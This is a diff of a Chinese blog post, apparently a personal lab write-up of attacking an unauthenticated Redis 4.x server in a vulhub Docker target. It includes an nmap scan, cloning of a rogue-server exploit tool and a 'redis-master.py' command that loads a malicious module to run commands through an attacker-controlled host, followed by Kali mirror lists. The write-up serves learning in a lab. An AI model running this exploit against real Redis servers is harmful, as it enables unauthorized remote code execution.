@@ -397,14 +397,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-28
+                    2021-07-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    753
+                    781
                 </div>
                 
 
@@ -431,14 +431,15 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><p>测试环境：</p>
+                <h1 id="Redis-4-unacc"><a href="#Redis-4-unacc" class="headerlink" title="Redis 4-unacc"></a>Redis 4-unacc</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>攻击者：192.168.229.129</p>
+<p>靶机：192.168.229.137</p>
 <h2 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h2><p>使用docker和docker-compose运行漏洞环境vulhub</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">进入vulhub中Redis的4-unacc目录</span><br><span class="line">docker-compose build &#x2F;&#x2F;对靶场进行编译</span><br><span class="line">docker-compose up -d &#x2F;&#x2F;运行靶场</span><br><span class="line">docker-compose down &#x2F;&#x2F;移除靶场</span><br></pre></td></tr></table></figure>
 
 
 <p><img src="https://i.loli.net/2021/06/28/qJgE9XUH8Nwrl4s.png"></p>
 <p><img src="https://i.loli.net/2021/06/28/eTB7CAV3FbQmRlt.png" alt="image-20210628210758753"></p>
-<h2 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h2><p>攻击机也要安装Redis</p>
+<h2 id="安装Redis"><a href="#安装Redis" class="headerlink" title="安装Redis"></a>安装Redis</h2><p>攻击者也要安装Redis</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.12.tar.gz #下载</span><br><span class="line">2.tar -xzf redis-2.8.12.tar.gz #解压</span><br><span class="line">3.cd到redis-2.8.12 目录下</span><br><span class="line">4.输入命令make #安装</span><br><span class="line">5.进入redis-2.8.12&#x2F;src&#x2F;目录下</span><br><span class="line">6.输入命令&#96;.&#x2F;redis-cli -h&#96;，出现帮助内容就表示可以使用了</span><br></pre></td></tr></table></figure>
 <p><img src="https://i.loli.net/2021/06/28/8HXJehCYPLgbwRn.png" alt="image-20210628131141013"></p>
 <h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>nmap可以扫描出靶机6379的Redis服务器</p>
@@ -452,15 +453,16 @@
 <p><img src="https://i.loli.net/2021/06/28/uC1FEcHXLQidvGM.png" alt="image-20210628144753019"></p>
 <p>返回到<code>redis-rogue-server.py</code>目录下</p>
 <p><code>./redis-rogue-server.py --rhost  --lhost </code></p>
-<p><img src="https://i.loli.net/2021/06/28/u1UFq7KBPRaIC8p.png" alt="image-20210628145723698"></p>
+<p><img src="https://i.loli.net/2021/07/24/Kyfbumq3zYErXdx.png" alt="image-20210724191619236"></p>
 <p>然后就卡住了。。</p>
 <p>换了个exp</p>
 <p><code>git clone https://github.com/vulhub/redis-rogue-getshell.git</code></p>
 <p><img src="/2021/06/28/redis-4-unacc/Users\王\AppData\Roaming\Typora\typora-user-images\image-20210628191840574.png" alt="image-20210628191840574"></p>
 <p><code>./redis-master.py -r 靶机IP -p 6379 -L 攻击机IP -P 8989 -f RedisModulesSDK/exp/exp.so -c &quot;whoami&quot;</code></p>
-<p><img src="https://i.loli.net/2021/06/28/7Rr1X2tn9oMcCYb.png" alt="image-20210628200252772"></p>
+<p><img src="https://i.loli.net/2021/07/24/lNbpzYX9uBOGr8x.png" alt="image-20210724191339232"></p>
 <p>然后就又卡住了。。。</p>
-<h2 id="在另一台kali上搭建docker"><a href="#在另一台kali上搭建docker" class="headerlink" title="在另一台kali上搭建docker"></a>在另一台kali上搭建docker</h2><p>结果原来的阿里源不能用了，又折腾了半天换源。。（图中的是中科大的源也还是不行）</p>
+<h2 id="在新的靶机上搭建docker"><a href="#在新的靶机上搭建docker" class="headerlink" title="在新的靶机上搭建docker"></a>在新的靶机上搭建docker</h2><p>vps不好用，搭了个本地的环境来演示</p>
+<p>结果原来的阿里源不能用了，又折腾了半天换源。。（图中的是中科大的源也还是不行）</p>
 <p><img src="https://i.loli.net/2021/06/28/qJRZCSbj37pl6fk.png" alt="image-20210628203059513"></p>
 <p>最后也是糊里糊涂添加了一堆源</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#中科大</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">#163</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy main non-free contrib</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian wheezy-proposed-updates main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.163.com&#x2F;debian-security wheezy&#x2F;updates main non-free contrib</span><br><span class="line">#东软大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.neusoft.edu.cn&#x2F;kali kali-rolling&#x2F;main non-free contrib</span><br></pre></td></tr></table></figure>
